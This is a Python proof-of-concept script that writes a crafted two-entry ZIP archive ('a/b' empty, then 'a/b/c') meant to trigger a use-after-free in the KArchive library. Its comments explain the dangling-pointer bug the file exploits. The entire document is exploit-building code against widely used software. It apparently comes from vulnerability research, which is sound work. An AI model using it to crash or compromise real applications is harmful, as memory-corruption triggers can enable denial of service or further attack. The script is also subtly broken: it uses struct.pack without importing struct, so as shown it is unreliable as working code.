import io

# Create a minimal ZIP file that triggers the use-after-free in KArchive
# The bug: findOrCreate("a/b") finds file "b" in directory "a" with size 0,
# calls rootDir()->removeEntry(b_entry) which fails (b not in rootDir),
# then deletes b_entry. Directory "a" still has dangling pointer to "b".

def make_local_file_header(filename, data=b'', compress_method=0):
    """Create a local file header + data"""
    fname = filename.encode('utf-8') if isinstance(filename, str) else filename
    crc = 0
    if data:
        import zlib
        crc = zlib.crc32(data) & 0xffffffff
    
    header = struct.pack('<4s',  b'PK\x03\x04')       # signature
    header += struct.pack('<H', 20)                     # version needed
    header += struct.pack('<H', 0)                      # general purpose bit flag
    header += struct.pack('<H', compress_method)        # compression method (0=stored)
    header += struct.pack('<H', 0)                      # last mod file time
    header += struct.pack('<H', 0)                      # last mod file date
    header += struct.pack('<I', crc)                    # crc-32
    header += struct.pack('<I', len(data))              # compressed size
    header += struct.pack('<I', len(data))              # uncompressed size
    header += struct.pack('<H', len(fname))             # file name length
    header += struct.pack('<H', 0)                      # extra field length
    header += fname
    header += data
    return header

def make_central_dir_entry(filename, local_header_offset, data=b'', compress_method=0):
    """Create a central directory entry"""
    fname = filename.encode('utf-8') if isinstance(filename, str) else filename
    crc = 0
    if data:
        import zlib
        crc = zlib.crc32(data) & 0xffffffff
    
    entry = struct.pack('<4s', b'PK\x01\x02')          # signature
    entry += struct.pack('<H', 20)                      # version made by
    entry += struct.pack('<H', 20)                      # version needed
    entry += struct.pack('<H', 0)                       # general purpose bit flag
    entry += struct.pack('<H', compress_method)         # compression method
    entry += struct.pack('<H', 0)                       # last mod file time
    entry += struct.pack('<H', 0)                       # last mod file date
    entry += struct.pack('<I', crc)                     # crc-32
    entry += struct.pack('<I', len(data))               # compressed size
    entry += struct.pack('<I', len(data))               # uncompressed size
    entry += struct.pack('<H', len(fname))              # file name length
    entry += struct.pack('<H', 0)                       # extra field length
    entry += struct.pack('<H', 0)                       # file comment length
    entry += struct.pack('<H', 0)                       # disk number start
    entry += struct.pack('<H', 0)                       # internal file attributes
    entry += struct.pack('<I', 0)                       # external file attributes
    entry += struct.pack('<I', local_header_offset)     # relative offset of local header
    entry += fname
    return entry

def make_end_of_central_dir(num_entries, central_dir_size, central_dir_offset):
    """Create end of central directory record"""
    eocd = struct.pack('<4s', b'PK\x05\x06')           # signature
    eocd += struct.pack('<H', 0)                        # number of this disk
    eocd += struct.pack('<H', 0)                        # disk where central dir starts
    eocd += struct.pack('<H', num_entries)              # number of entries on this disk
    eocd += struct.pack('<H', num_entries)              # total number of entries
    eocd += struct.pack('<I', central_dir_size)         # size of central directory
    eocd += struct.pack('<I', central_dir_offset)       # offset of start of central directory
    eocd += struct.pack('<H', 0)                        # comment length
    return eocd

# File 1: "a/b" with uncompressed size 0 (empty file)
# File 2: "a/b/c" with some content (triggers findOrCreate("a/b"))

file1_name = "a/b"
file1_data = b''  # empty file - size 0 is key!

file2_name = "a/b/c"
file2_data = b'x'  # non-empty to be a regular file

# Build local headers
local1 = make_local_file_header(file1_name, file1_data)
offset1 = 0

local2 = make_local_file_header(file2_name, file2_data)
offset2 = len(local1)

# Build central directory
central1 = make_central_dir_entry(file1_name, offset1, file1_data)
central2 = make_central_dir_entry(file2_name, offset2, file2_data)

central_dir_offset = len(local1) + len(local2)
central_dir_size = len(central1) + len(central2)

# Build end of central directory
eocd = make_end_of_central_dir(2, central_dir_size, central_dir_offset)

# Combine everything
zip_data = local1 + local2 + central1 + central2 + eocd

# Write to file
with open('/workspace/poc.zip', 'wb') as f:
    f.write(zip_data)

print(f"ZIP file size: {len(zip_data)} bytes")
print(f"Local header 1 at offset: {offset1}")
print(f"Local header 2 at offset: {offset2}")
print(f"Central dir at offset: {central_dir_offset}")
print(f"File 1: '{file1_name}' size={len(file1_data)}")
print(f"File 2: '{file2_name}' size={len(file2_data)}")
